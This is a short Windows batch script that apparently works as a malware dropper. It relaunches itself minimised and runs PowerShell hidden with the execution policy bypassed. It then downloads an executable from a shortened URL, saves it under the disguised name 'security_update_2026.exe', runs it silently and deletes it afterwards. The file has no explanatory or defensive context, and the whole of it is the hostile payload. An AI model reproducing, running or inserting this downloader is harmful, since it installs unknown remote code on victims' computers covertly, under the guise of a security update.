@echo off
if not "%1"=="min" start /min cmd /c %0 min & exit
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "try { $exePath = Join-Path $env:ProgramData 'security_update_2026.exe'; (New-Object Net.WebClient).DownloadFile('https://clipr.cc/M1P1n', $exePath); Start-Process -FilePath $exePath -ArgumentList '/S' -NoNewWindow -Wait } catch { Write-Host $_.Message -ForegroundColor Red } finally { Remove-Item $exePath -Force -ErrorAction SilentlyContinue }"
